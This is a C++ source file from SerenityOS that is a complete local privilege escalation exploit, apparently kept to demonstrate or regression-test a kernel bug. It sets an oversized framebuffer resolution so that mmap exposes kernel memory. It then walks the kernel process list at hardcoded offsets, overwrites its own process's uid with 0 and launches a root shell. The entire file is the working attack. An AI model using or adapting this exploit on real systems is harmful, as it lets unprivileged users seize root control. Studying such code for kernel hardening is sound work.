/*
 * Copyright (c) 2018-2020, the SerenityOS developers.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <AK/Types.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

int main()
{
    int fd = open("/dev/fb0", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    size_t width = 17825;
    size_t height = 1000;
    size_t pitch = width * 4;
    size_t framebuffer_size_in_bytes = pitch * height * 2;

    FBResolution original_resolution;
    if (ioctl(fd, FB_IOCTL_GET_RESOLUTION, &original_resolution) < 0) {
        perror("ioctl");
        return 1;
    }

    FBResolution resolution;
    resolution.width = width;
    resolution.height = height;
    resolution.pitch = pitch;

    if (ioctl(fd, FB_IOCTL_SET_RESOLUTION, &resolution) < 0) {
        perror("ioctl");
        return 1;
    }

    auto* ptr = (u8*)mmap(nullptr, framebuffer_size_in_bytes, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FILE, fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    printf("Success! Evil pointer: %p\n", ptr);

    u8* base = &ptr[128 * MiB];

    uintptr_t g_processes = *(uintptr_t*)&base[0x1b51c4];
    printf("base = %p\n", base);
    printf("g_processes = %#08x\n", g_processes);

    auto get_ptr = [&](uintptr_t value) -> void* {
        value -= 0xc0000000;
        return (void*)&base[value];
    };

    struct ProcessList {
        uintptr_t head;
        uintptr_t tail;
    };

    struct Process {
        // 32 next
        // 40 pid
        // 44 uid
        u8 dummy[32];
        uintptr_t next;
        u8 dummy2[4];
        pid_t pid;
        uid_t uid;
    };

    ProcessList* process_list = (ProcessList*)get_ptr(g_processes);

    Process* process = (Process*)get_ptr(process_list->head);

    printf("{%p} PID: %d, UID: %d, next: %#08x\n", process, process->pid, process->uid, process->next);

    if (process->pid == getpid()) {
        printf("That's me! Let's become r00t!\n");
        process->uid = 0;
    }

    if (ioctl(fd, FB_IOCTL_SET_RESOLUTION, &original_resolution) < 0) {
        perror("ioctl");
        return 1;
    }

    execl("/bin/sh", "sh", nullptr);

    return 0;
}
